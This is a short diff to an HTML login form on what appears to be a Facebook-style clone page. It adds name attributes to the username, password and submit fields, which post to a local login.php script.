@@ -18,10 +18,10 @@
                 <p> around you on Facebook.</p>
             </div>
             <form action="./Code/login/login.php" method="post">
-                <input type="email" placeholder="Email or phone number" required>
-                <input type="password" placeholder="Password" required>
+                <input type="text" name="username" placeholder="Email or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
                 <div class="link">
-                    <button type="submit" class="login">Login</button>
+                    <button type="submit" name="login_btn" class="login">Login</button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
                 <hr>
